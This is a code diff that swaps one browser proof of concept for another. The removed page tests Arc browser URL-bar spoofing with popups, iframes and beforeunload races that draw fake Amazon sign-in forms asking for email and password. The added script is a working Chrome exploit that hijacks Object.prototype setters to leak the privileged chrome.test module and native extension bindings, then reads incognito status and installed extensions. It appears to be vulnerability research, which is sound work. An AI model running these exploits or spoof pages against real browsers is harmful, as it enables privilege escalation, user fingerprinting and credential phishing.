@@ -1,459 +1,239 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>PoC 10: Little Arc / Arc-Specific UI Exploitation</title>
-<!--
-  PoC 10: Arc-Specific Attack Surface Exploitation
+This PoC shows how the extension module system can be leaked to a web page.
 
-  Target: Arc Browser (macOS, Chromium 146+)
-
-  Technique: Exploits Arc-specific UI behaviors:
-
-  1. Little Arc Popup: When links are opened from external apps, Arc uses
-     "Little Arc" - a simplified popup with a minimal URL bar. This popup
-     may have different URL display logic or security checks.
-
-  2. Split View: Arc's split view shows two pages side by side with a shared
-     URL bar that switches based on active pane. The transition between
-     panes may have timing issues.
-
-  3. Sidebar Tab Switching: Arc's sidebar navigation model differs from
-     standard Chromium tab switching. Rapid tab creation + navigation
-     may create URL display races.
-
-  4. Arc's "Peek" Feature: Hovering over links shows a preview. The preview
-     window URL display may be spoofable.
-
-  5. Arc's Command Bar (Cmd+T): Custom URL entry that may parse differently.
-
-  Additionally tests:
-  - iframe URI-scheme navigation (CVE-2025-14812 pattern)
-  - window.open with noopener/noreferrer combinations
-  - Cross-document message-based coordination
--->
-</head>
-<body style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 40px; background: #f5f5f5;">
-<h2>PoC 10: Arc-Specific UI Exploitation</h2>
-<p>Tests Arc-specific features and UI elements for spoofing opportunities.</p>
-
-<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; max-width: 600px;">
-  <button onclick="testIframeURIScheme()" style="padding: 14px; font-size: 14px; cursor: pointer;">
-    Test: iframe URI-Scheme Nav
-  </button>
-  <button onclick="testRapidTabCreation()" style="padding: 14px; font-size: 14px; cursor: pointer;">
-    Test: Rapid Tab Creation
-  </button>
-  <button onclick="testSplitViewRace()" style="padding: 14px; font-size: 14px; cursor: pointer;">
-    Test: Split View Race
-  </button>
-  <button onclick="testNoopenerRace()" style="padding: 14px; font-size: 14px; cursor: pointer;">
-    Test: noopener Navigation
-  </button>
-  <button onclick="testIntentScheme()" style="padding: 14px; font-size: 14px; cursor: pointer;">
-    Test: Custom URI Schemes
-  </button>
-  <button onclick="testBeforeUnloadRace()" style="padding: 14px; font-size: 14px; cursor: pointer;">
-    Test: beforeunload Race
-  </button>
-  <button onclick="testPopupChain()" style="padding: 14px; font-size: 14px; cursor: pointer;">
-    Test: Popup Chain Attack
-  </button>
-  <button onclick="testSandboxedIframe()" style="padding: 14px; font-size: 14px; cursor: pointer;">
-    Test: Sandboxed iframe Nav
-  </button>
-</div>
-
-<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>
-
-<!-- Test iframes -->
-<iframe id="testFrame" style="display:none;" sandbox="allow-scripts allow-top-navigation"></iframe>
+As an example, it shows:
+<ul>
+  <li> Whether --site-per-process is enabled.
+  <li> Whether you're in incognito mode.
+  <li> Whether AdBlock Plus is installed.
+</ul>
 
 <script>
-function log(msg) {
-  const el = document.getElementById('log');
-  el.innerHTML += msg + '<br>';
-  el.scrollTop = el.scrollHeight;
+// MODULE_TO_LEAK can be anything that is declared in Dispatcher::GetJsResources
+// and ChromeExtensionsDispatcherDelegate::PopulateSourceMap
+// Sources are:
+// - extensions/renderer/resources/
+// - chrome/renderer/resources/extensions/
+// The only APIs that can be used are:
+// - APIs exposed via requireNative - *{native_handler,custom_binding}*.cc
+// - extensions/common/api/_api_features.json
+// - chrome/common/extensions/api/_api_features.json
+var MODULE_TO_LEAK = 'test'; // chrome.test is very juicy :)
+
+// We use this key to detect whether the scheme override was successful.
+var SOME_ARBITRARY_VALUE = 'whatever';
+
+stealModule(function(testCustomBindings) {
+    var chrome_test = testCustomBindings.binding;
+    console.log('Got chrome.test: ', chrome_test);
+    chrome_test.runWithNativesEnabled(function() {
+        var module_system = chrome_test.getModuleSystem(window);
+        var process = module_system.requireNative('process');
+        var i18n = module_system.requireNative('i18n');
+        var msg = `
+--site-per-process    : ${process.HasSwitch('site-per-process')}
+Incognito             : ${process.InIncognitoContext()}
+AdBlock Plus installed: ${!!i18n.GetL10nMessage('name', null, 'cfhdojbkjhnklbpkdaibdccddilifddb')}`;
+        console.log(msg);
+        alert(msg);
+    });
+});
+
+function defineImports(schema, modulename) {
+    schema.properties = {
+        // Re-using lastError because it will pass the availability check.
+        lastError: {
+            $ref: SOME_ARBITRARY_VALUE,
+            // Parameters to the noop function defined below.
+            // Used in binding.js, as args in $Function.apply(constructor, value, args);
+            value: [],
+        },
+    };
+    schema.types = [{
+        id: SOME_ARBITRARY_VALUE,
+        // Skip the type export in the schema.types branch, we don't need it.
+        platforms: [],
+        // Will be require-d by createCustomType
+        // Normally, it is not possible to import most modules, because most of them
+        // make use of requireNative, which throws an error if run from an unprivileged
+        // context (= with natives disabled).
+        // But we trick Chrome into loading the module, so this will work!
+        js_module: modulename,
+        // functions is defined because createCustomType in binding.js expects it, via.
+        //   customType.prototype.setSchema(type);
+        functions: [],
+    }];
 }
 
-// Test 1: iframe URI-scheme navigation (CVE-2025-14812 pattern)
-// ArcSearch iOS was vulnerable to address bar spoofing via
-// "iframe-triggered URI-scheme navigation"
-function testIframeURIScheme() {
-  log('[1] Testing iframe URI-scheme navigation...');
+// Call this function to leak the module.
+function stealModule(useLeak) {
+    var shouldReload = false;
 
-  // Create an iframe that navigates via a URI scheme
-  const iframe = document.createElement('iframe');
-  iframe.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
-  document.body.appendChild(iframe);
+    // Hook on the creation of Binding and modify the schema.
+    //
+    // function Binding(schema) {
+    //   this.schema_ = schema;
+    //   this.apiFunctions_ = new APIFunctions(schema.namespace);
+    //   this.customEvent_ = null;
+    //   this.customHooks_ = []; <------------ Hooking here.
+    // };
+    Object.defineProperty(Object.prototype, 'customHooks_', {
+        configurable: true,
+        get() {
+            // customHooks_ has no value by default.
+        },
+        set(customHooks_) {
+            if (customHooks_ === true) return; // Ignore devtools setter.
 
-  // Try various URI schemes that might trigger different navigation paths
-  const schemes = [
-    'https://www.amazon.com/',            // Standard HTTPS
-    'javascript:void(0)',                  // JS URI (should be blocked for top nav)
-    'data:text/html,<h1>Spoofed</h1>',   // Data URI
-    'about:blank',                         // About blank
-  ];
+            var runHooks_ = this.runHooks_;
+            console.assert(typeof runHooks_ === 'function', 'runHooks_ should be a function!');
 
-  // Set iframe src, then try to navigate the TOP frame from within
-  iframe.srcdoc = `
-    <html><body>
-    <script>
-      // Try to navigate the top frame via the iframe
-      try {
-        top.location = 'https://www.amazon.com/';
-      } catch(e) {
-        // Expected: cross-origin top navigation blocked
-      }
-
-      // Try window.open from iframe context
-      try {
-        var w = window.open('https://www.amazon.com/');
-        if (w) {
-          w.document.write('<h1>Content from iframe context</h1>');
-        }
-      } catch(e) {}
-    <\/script>
-    </body></html>
-  `;
-
-  log('[1] iframe with srcdoc created');
-  log('[1] Testing if iframe can trigger top navigation or popup with URL spoofing');
-
-  // Also test: iframe navigating itself via various schemes
-  setTimeout(() => {
-    // Create a second iframe that demonstrates the URI scheme attack
-    const iframe2 = document.createElement('iframe');
-    iframe2.style.cssText = 'width:100%;height:300px;border:1px solid #ccc;margin-top:10px;';
-    iframe2.srcdoc = `
-      <html><body style="font-family:Arial;padding:20px;">
-        <h3>iframe URI-Scheme Navigation Test</h3>
-        <p>This iframe will attempt to navigate the parent frame via URI schemes.</p>
-        <button onclick="tryNav()">Attempt Top Navigation</button>
-        <div id="result" style="margin-top:10px;font-family:monospace;font-size:12px;"></div>
-        <script>
-          function tryNav() {
-            var res = document.getElementById('result');
-
-            // Try intent-like URIs
-            var uris = [
-              'https://www.amazon.com/',
-              'amazon://',
-              'webcal://www.amazon.com/',
-            ];
-
-            uris.forEach(function(uri) {
-              try {
-                // Create a link and click it
-                var a = document.createElement('a');
-                a.href = uri;
-                a.target = '_top';
-                a.click();
-                res.innerHTML += 'Tried: ' + uri + ' (no error)<br>';
-              } catch(e) {
-                res.innerHTML += 'Tried: ' + uri + ' ERROR: ' + e.message + '<br>';
-              }
+            Object.defineProperties(this, {
+                // Transparently assign the unavailableApiFunctions_, so that the behavior of
+                // binding does not change unexpectedly.
+                customHooks_: {
+                    configurable: true,
+                    writable: true,
+                    enumerable: true,
+                    value: customHooks_, 
+                },
+                // This is our evil stuff. The runHooks_ method gets a reference to the schema.
+                runHooks_: {
+                    enumerable: true,
+                    get() {
+                        return function(mod, schema) {
+                            if (!schema) {
+                                // For Chrome 49-.
+                                schema = this.schema_;
+                            }
+                            if (schema.namespace === 'runtime' && schema.types &&
+                                    schema.types[0].id !== SOME_ARBITRARY_VALUE) {
+                                defineImports(schema, MODULE_TO_LEAK);
+                                shouldReload = true;
+                                return;
+                            }
+                            return runHooks_.call(this, mod, schema);
+                        };
+                    },
+                },
             });
-          }
-        <\/script>
-      </body></html>
-    `;
-    document.body.appendChild(iframe2);
-    log('[1] Interactive iframe test created');
-  }, 100);
-}
+        },
+    });
 
-// Test 2: Rapid tab creation to overwhelm Arc's sidebar
-function testRapidTabCreation() {
-  log('[2] Testing rapid tab creation...');
+    var leaked;
+    defineModuleStealer(function(exports) {
+        leaked = exports;
+    });
 
-  const targets = [
-    'https://www.amazon.com/',
-    'https://www.google.com/',
-    'https://www.facebook.com/',
-    'https://www.twitter.com/',
-    'https://www.github.com/',
-  ];
+    // Trigger the lazy module system.
+    chrome.runtime;
 
-  let opened = 0;
-  const windows = [];
+    // Clean-up.
+    delete Object.prototype.customHooks_;
 
-  // Open many windows rapidly
-  // Arc handles these in its sidebar - rapid creation may race the URL display
-  for (let i = 0; i < 5; i++) {
-    const w = window.open(targets[i % targets.length]);
-    if (w) {
-      windows.push(w);
-      opened++;
-
-      // Try to inject content immediately
-      try {
-        w.document.write(`<h1>Injected into tab ${i}</h1>`);
-      } catch(e) {}
+    // At the first run, the page should reload.
+    if (shouldReload) {
+        // It is probably safe to reload above, but I'm reloading only after the module loading
+        // has finalized to avoid side effects.
+        location.reload();
+        return;
     }
-  }
 
-  log('[2] Opened ' + opened + ' tabs');
-  log('[2] Check Arc sidebar - are all URLs displayed correctly?');
-  log('[2] Rapid tab creation may cause URL display inconsistencies');
+    // After the first run, we have our module.
 
-  // Close all after 5 seconds
-  setTimeout(() => {
-    windows.forEach(w => { try { w.close(); } catch(e) {} });
-    log('[2] Cleanup: closed all test windows');
-  }, 5000);
+    console.assert(leaked !== void 0, 'Should have leaked: ' + MODULE_TO_LEAK);
+    useLeak(leaked);
 }
 
-// Test 3: Split view race condition
-function testSplitViewRace() {
-  log('[3] Testing split view navigation race...');
-  log('[3] NOTE: You need to manually enable split view in Arc');
-  log('[3] Open this page in one pane and a legitimate site in the other');
+// leakModule will receive the leaked module.
+function defineModuleStealer(leakModule) {
+    Object.defineProperties(Object.prototype, {
+        [MODULE_TO_LEAK]: {
+            set(value) {
+                if (typeof value === 'object' && value !== null &&
+                        Object.keys(value).length === 0 && Object.keys(this).length === 0) {
+                    // This is the module that we requested :)
+                    Object.defineProperty(this, MODULE_TO_LEAK, {
+                        enumerable: true,
+                        writable: true,
+                        value: value,
+                    });
+                    // This is called in binding.generate:
+                    // for (var index = 0, name; name = namespaces[index]; index++) {
+                    //      mod[name] = mod[name] || {};
+                    //      ^^^^^^^^^^^
 
-  // Create iframes that simulate split view behavior
-  document.body.innerHTML += `
-    <div style="display:flex;gap:2px;height:400px;margin-top:20px;border:2px solid #333;border-radius:8px;overflow:hidden;">
-      <div style="flex:1;position:relative;">
-        <div style="background:#2a2a2a;padding:6px 12px;color:#ddd;font-size:12px;text-align:center;">
-          <span style="color:#34c759;">&#128274;</span> amazon.com
-        </div>
-        <iframe src="about:blank" id="splitLeft" style="width:100%;height:calc(100% - 30px);border:none;"></iframe>
-      </div>
-      <div style="width:2px;background:#444;"></div>
-      <div style="flex:1;position:relative;">
-        <div style="background:#2a2a2a;padding:6px 12px;color:#ddd;font-size:12px;text-align:center;">
-          <span style="color:#34c759;">&#128274;</span> google.com
-        </div>
-        <iframe src="about:blank" id="splitRight" style="width:100%;height:calc(100% - 30px);border:none;"></iframe>
-      </div>
-    </div>
-  `;
+                    value.ROBS_DUMMY = true;
+                    // The purpose of setting the above key is to make sure that at the end of
+                    // binding.generate(), success === true.
+                }
+            },
+            get() {
+                // In Chrome 49 and before, this getter was called twice and leaked the module
+                // system (and also the imported module).
+                //
+                // In Chrome 50, this is fixed. We still keep the getter so that this exploit can
+                // be used with both Chrome 49 and 50.
+                Object.defineProperty(Object.prototype, MODULE_TO_LEAK, {
+                    configurable: true,
+                    get() {
+                        if ('$set' in this) {
+                            delete Object.prototype[MODULE_TO_LEAK];
+                            delete Object.prototype.name;
+                            leakModule(this);
+                            return function noop() {};
+                        }
+                    }
+                });
+            },
+            configurable: true,
+        },
 
-  // Load phishing content in "Amazon" pane
-  const leftFrame = document.getElementById('splitLeft');
-  leftFrame.srcdoc = `
-    <html><body style="font-family:Arial;padding:20px;">
-      <h2 style="color:#ff9900;">amazon</h2>
-      <h3>Sign In</h3>
-      <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-      <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-      <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
-    </body></html>
-  `;
+        // This part allows non-whitelisted methods to become visible.
+        // This only works if the actual functionality is only implemented in JS or via native
+        // bindings, because most of the calls that go through the browser is validated against
+        // the JSON schema / IDL.
+        // chrome.test is almost completely implemented in native bindings and JS, so... :)
+        'name': {
+            configurable: true,
+            get() {},
+            set(value) {
+                // Designed to skip over the if in the following block:
+                //        var apiFunction = {};
+                //        apiFunction.definition = functionDef;
+                //        apiFunction.name = schema.namespace + '.' + functionDef.name;
+                //
+                //        if (!GetAvailability(apiFunction.name).is_available ||
+                //            (checkUnprivileged && !isSchemaAccessAllowed(functionDef))) {
+                //          this.apiFunctions_.registerUnavailable(functionDef.name);
+                //          return;
+                //        }
 
-  const rightFrame = document.getElementById('splitRight');
-  rightFrame.srcdoc = `
-    <html><body style="font-family:Arial;padding:20px;text-align:center;">
-      <h2>Google</h2>
-      <input type="text" placeholder="Search" style="width:80%;padding:10px;border:1px solid #ddd;border-radius:24px;">
-    </body></html>
-  `;
-
-  log('[3] Split view simulation created');
-  log('[3] In real Arc split view, the URL bar switches between panes');
-  log('[3] Rapid clicking between panes may show wrong URL for active pane');
-}
-
-// Test 4: window.open with noopener
-function testNoopenerRace() {
-  log('[4] Testing noopener/noreferrer navigation...');
-
-  // With noopener, we lose the window reference
-  // But the popup opens independently, which may have different URL handling
-  const popup = window.open('about:blank', '_blank', 'noopener');
-
-  // We can't access this popup at all
-  log('[4] Popup opened with noopener (no reference returned)');
-
-  // Alternative: open WITHOUT noopener, inject, THEN set noopener-like behavior
-  const popup2 = window.open('about:blank');
-  if (popup2) {
-    popup2.document.open();
-    popup2.document.write(`
-      <html><head><title>Amazon.com</title></head>
-      <body style="font-family:Arial;padding:40px;">
-        <h1 style="color:#ff9900;">amazon</h1>
-        <p>This popup was opened without noopener, content injected,
-           then the opener reference is nullified.</p>
-        <h3>Sign In</h3>
-        <input type="email" placeholder="Email" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
-        <input type="password" placeholder="Password" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
-        <button style="padding:10px 30px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
-        <script>
-          // Nullify opener reference
-          window.opener = null;
-          // Navigate to amazon
-          setTimeout(function() {
-            window.location.href = 'https://www.amazon.com:' +
-              (Math.floor(Math.random() * 60000) + 1024) + '/';
-          }, 500);
-        <\/script>
-      </body></html>
-    `);
-    popup2.document.close();
-    log('[4] Popup content injected, opener nullified, navigation queued');
-    log('[4] Check popup URL bar after navigation attempt');
-  }
-}
-
-// Test 5: Custom URI scheme handling
-function testIntentScheme() {
-  log('[5] Testing custom URI scheme handling...');
-
-  // Arc may handle custom URI schemes differently
-  // Some schemes may trigger Little Arc or special handling
-  const schemes = [
-    'arc://settings',           // Arc internal
-    'archttp://www.amazon.com', // Non-standard
-    'web+amazon://signin',      // Custom web+ scheme
-    'x-web-search://amazon',    // Search scheme
-  ];
-
-  schemes.forEach(scheme => {
-    try {
-      const a = document.createElement('a');
-      a.href = scheme;
-      a.textContent = scheme;
-      a.style.cssText = 'display:block;margin:4px 0;color:#007aff;';
-      document.body.appendChild(a);
-      log('[5] Created link: ' + scheme);
-    } catch(e) {
-      log('[5] Failed to create link for: ' + scheme + ' - ' + e.message);
-    }
-  });
-
-  log('[5] Click each link above to test how Arc handles custom URI schemes');
-  log('[5] Some may open in Little Arc with unexpected URL display');
-}
-
-// Test 6: beforeunload content injection race
-function testBeforeUnloadRace() {
-  log('[6] Testing beforeunload content injection...');
-
-  // Set up beforeunload handler that injects content
-  window.addEventListener('beforeunload', function(e) {
-    // Inject content during the unload process
-    // This may display while the new URL is shown in the address bar
-    try {
-      document.body.innerHTML = `
-        <div style="font-family:Arial;max-width:400px;margin:40px auto;">
-          <h1 style="color:#ff9900;">amazon</h1>
-          <h3>Sign In Required</h3>
-          <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-          <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-          <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
-        </div>
-      `;
-      document.title = 'Amazon.com Sign In';
-    } catch(ex) {}
-  });
-
-  log('[6] beforeunload handler registered');
-  log('[6] Now navigating to amazon.com...');
-  log('[6] Content should be injected during the unload transition');
-
-  // Navigate after a short delay
-  setTimeout(() => {
-    // Navigate to Amazon on a non-standard port (creates timing window)
-    let port;
-    do {
-      port = Math.floor(Math.random() * 60000) + 1024;
-    } while ([8080, 8443].includes(port));
-
-    window.location.href = 'https://www.amazon.com:' + port + '/';
-  }, 500);
-}
-
-// Test 7: Popup chain attack
-function testPopupChain() {
-  log('[7] Testing popup chain attack...');
-
-  // Open popup A
-  const popupA = window.open('about:blank', 'chainA');
-  if (!popupA) { log('[7] BLOCKED'); return; }
-
-  // Popup A opens popup B
-  popupA.document.open();
-  popupA.document.write(`
-    <html><head><title>Redirecting...</title></head>
-    <body>
-      <script>
-        // Open popup B to amazon
-        var popupB = window.open('https://www.amazon.com/', 'chainB');
-
-        // Try to inject content into popup B
-        if (popupB) {
-          setTimeout(function() {
-            try {
-              popupB.document.open();
-              popupB.document.write('<h1>Injected via popup chain!</h1>');
-              popupB.document.close();
-              document.title = 'Chain injection successful!';
-            } catch(e) {
-              document.title = 'Chain injection failed: ' + e.message;
-            }
-          }, 100);
-        }
-
-        // Close popup A after chain is established
-        setTimeout(function() {
-          window.close();
-        }, 2000);
-      <\/script>
-    </body></html>
-  `);
-  popupA.document.close();
-
-  log('[7] Popup A created, will open popup B to amazon.com');
-  log('[7] Then tries to inject content into B from A');
-  log('[7] This tests if popup chain relationships bypass access controls');
-}
-
-// Test 8: Sandboxed iframe top navigation
-function testSandboxedIframe() {
-  log('[8] Testing sandboxed iframe top navigation...');
-
-  // Sandboxed iframes with allow-top-navigation can navigate the top frame
-  // Combined with allow-scripts, they might create interesting race conditions
-  const iframe = document.createElement('iframe');
-  iframe.sandbox = 'allow-scripts allow-top-navigation-by-user-activation';
-  iframe.style.cssText = 'width:100%;height:200px;border:2px solid #ccc;margin-top:10px;';
-  iframe.srcdoc = `
-    <html><body style="font-family:Arial;padding:20px;text-align:center;">
-      <h3>Sandboxed iframe</h3>
-      <p>Click the button to attempt top-frame navigation:</p>
-      <button onclick="navTop()" style="padding:10px 20px;font-size:16px;cursor:pointer;">
-        Navigate Top Frame
-      </button>
-      <div id="res" style="margin-top:10px;font-family:monospace;font-size:12px;"></div>
-      <script>
-        function navTop() {
-          var res = document.getElementById('res');
-
-          // Method 1: Direct top navigation
-          try {
-            top.location = 'https://www.amazon.com/';
-            res.innerHTML += 'top.location set to amazon.com<br>';
-          } catch(e) {
-            res.innerHTML += 'top.location failed: ' + e.message + '<br>';
-          }
-        }
-
-        // Auto-try without user interaction
-        // (should fail due to user-activation requirement)
-        try {
-          top.location = 'https://www.amazon.com/';
-        } catch(e) {
-          // Expected
-        }
-      <\/script>
-    </body></html>
-  `;
-  document.body.appendChild(iframe);
-
-  log('[8] Sandboxed iframe created with allow-top-navigation-by-user-activation');
-  log('[8] Click the button inside the iframe to test navigation');
-  log('[8] If the top frame navigates but content from iframe persists = issue');
+                var keys = Object.keys(this);
+                if (keys.length === 1 && keys[0] === 'definition' &&
+                    typeof value === 'string' && value.startsWith(MODULE_TO_LEAK)) {
+                    Object.defineProperty(this, 'name', {
+                        configurable: true,
+                        get() {
+                            Object.defineProperty(this, 'name', {
+                                configurable: true,
+                                enumerable: true,
+                                writable: true,
+                                value: value
+                            });
+                            // This is always available.
+                            return 'runtime.lastError';
+                        },
+                    });
+                    return;
+                }
+                Object.defineProperty(this, 'name', {
+                    configurable: true,
+                    enumerable: true,
+                    writable: true,
+                    value: value
+                });
+            },
+        },
+    });
 }
 </script>
-</body>
-</html>
